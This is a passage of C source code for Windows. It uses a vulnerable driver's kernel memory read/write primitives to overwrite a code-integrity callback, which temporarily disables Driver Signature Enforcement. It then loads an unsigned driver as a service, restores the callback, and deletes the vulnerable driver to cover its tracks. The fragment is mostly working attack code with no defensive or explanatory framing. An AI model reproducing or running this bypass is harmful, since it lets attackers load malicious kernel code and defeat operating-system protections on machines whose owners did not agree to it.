    }

    ULONGLONG targetAddr = ntBase + seciRva + SECI_CALLBACK_OFFSET;
    ULONGLONG safeFn = ntBase + safeRva;
    ULONGLONG current = 0;

    if (!ReadMem64(hDev, targetAddr, &current)) {
        dbg(L"[ob] cannot read callback\n");
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 9;
    }

    BOOL needPatch = current != safeFn;
    if (needPatch) {
        SaveState(current);
        if (!WriteMem64(hDev, targetAddr, safeFn)) {
            dbg(L"[ob] DSE patch failed\n");
            CloseHandle(hDev);
            RemoveVulnerableDriver();
            return 10;
        }
    }

    DWORD loadErr = 0;
    BOOL loaded = StartTargetService(driverPath, &loadErr);

    if (needPatch) {
        if (WriteMem64(hDev, targetAddr, current))
            ClearState();
    }

    CloseHandle(hDev);
    RemoveVulnerableDriver();
    if (!loaded) {
        if (DriverAlreadyLoaded())
            return 0;
        SetLastError(loadErr);
        return 11;
    }
    if (!DriverAlreadyLoaded()) {
        SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
        if (scm) {
            SC_HANDLE svc = OpenServiceW(scm, SERVICE_NAME, SERVICE_QUERY_STATUS);
            if (svc) {
                SERVICE_STATUS st;
                QueryServiceStatus(svc, &st);
                SetLastError(st.dwWin32ExitCode ? st.dwWin32ExitCode : st.dwCurrentState);
                CloseServiceHandle(svc);
            } else {
                SetLastError(GetLastError());
            }
            CloseServiceHandle(scm);
        }
        return 12;
    }
    return 0;
}
